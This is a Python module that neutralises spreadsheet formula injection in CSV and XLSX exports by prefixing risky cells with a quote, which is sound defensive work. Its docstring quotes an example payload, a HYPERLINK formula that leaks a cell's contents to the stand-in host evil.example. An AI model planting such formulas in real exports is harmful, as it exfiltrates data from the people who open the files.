"""Spreadsheet formula-injection guard for CSV / XLSX exports.

A cell whose text starts with ``=``, ``+``, ``-`` or ``@`` (or a tab / carriage
return, which Excel strips before looking again) is evaluated as a formula when
the export is opened in Excel, LibreOffice or Google Sheets. Every export in the
platform writes user-typed text — titles, remarks, names — so a record titled
``=HYPERLINK("https://evil.example/?"&A1,"Click")`` would run on the machine of
whoever downloads the register (CSV/XLSX formula injection, OWASP).

The mitigation is the standard one: prefix such a cell with a single quote so
the spreadsheet treats it as text. Only strings are touched — numbers, dates and
booleans are written as-is so a negative quantity is still a number.

The full-width forms (＝ ＋ － ＠) are included because some spreadsheet
importers normalise them to their ASCII equivalents before parsing.
"""

from __future__ import annotations

import csv
from collections.abc import Iterable
from typing import Any

FORMULA_TRIGGERS = frozenset("=+-@\t\r＝＋－＠")


def safe_cell(value: Any) -> Any:
    """Neutralise one cell. Non-strings pass through untouched."""
    if isinstance(value, str) and value and value[0] in FORMULA_TRIGGERS:
        return "'" + value
    return value


def safe_row(values: Iterable[Any]) -> list[Any]:
    """Neutralise every cell of a row."""
    return [safe_cell(v) for v in values]


def unsafe_cell(value: str) -> str:
    """Reverse `safe_cell` for a value read back from a file this platform
    generated (e.g. a downloaded import template), so the round trip is exact."""
    if len(value) > 1 and value[0] == "'" and value[1] in FORMULA_TRIGGERS:
        return value[1:]
    return value


class _SafeWriter:
    """`csv.writer` whose rows are passed through `safe_row` first."""

    def __init__(self, writer: Any) -> None:
        self._writer = writer

    def writerow(self, row: Iterable[Any]) -> Any:
        return self._writer.writerow(safe_row(row))

    def writerows(self, rows: Iterable[Iterable[Any]]) -> None:
        for row in rows:
            self.writerow(row)


def safe_writer(f: Any, *args: Any, **kwargs: Any) -> _SafeWriter:
    """Drop-in replacement for ``csv.writer(f, ...)`` that neutralises cells."""
    return _SafeWriter(csv.writer(f, *args, **kwargs))
